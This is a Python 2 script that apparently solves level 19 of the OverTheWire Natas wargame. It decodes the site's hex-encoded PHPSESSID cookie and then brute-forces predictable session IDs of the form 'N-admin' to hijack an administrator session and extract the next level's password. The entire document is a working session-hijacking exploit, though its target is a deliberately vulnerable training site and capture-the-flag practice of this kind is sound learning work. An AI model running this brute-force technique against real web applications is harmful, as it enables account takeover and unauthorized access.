# This code runs with python2
import requests
import re
import codecs
import binascii

username = "natas19"
password = "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs"
url = "http://%s.natas.labs.overthewire.org/"  % username

session = requests.Session()

response = session.get(url,auth=(username,password))
print(response.text)
print(response.cookies)
print("="*50)

# Get the right cookie (PHPSESSID)
response = session.post(url,auth=(username,password),data={"username":"admin","password":"password"})
print(response.text)
print(response.cookies)
print("="*50)

cookie_bytes = codecs.decode(response.cookies["PHPSESSID"], "hex") # bytes
cookie_plaintext = cookie_bytes.decode("utf-8") # string
print("Cookie in plaintext: " + cookie_plaintext)
print("="*50)

# testing encoding and decoding area
#print(binascii.hexlify(cookie_plaintext.encode())) # string to bytes and hexed
# exit(0)

# Bruteforcing Session IDs
for i in range(640):
	session_id = str(i) + "-admin"
	print("Trying " + str(session_id))
	print("Hexed " + binascii.hexlify(session_id.encode()).decode("utf-8"))
	response = session.post(url,auth=(username,password),data={'username':'admin','password':''},cookies={'PHPSESSID':binascii.hexlify(session_id.encode()).decode("utf-8")})
	if not (re.findall(r"You are logged in as a regular user. Login as an admin to retrieve credentials for natas20.</div>",response.text)):
		password = re.findall("Username: natas20\nPassword: (.*)</pre>",response.text)[0]
		break

print("="*50)
print("\nThe password for the next level is: " + password)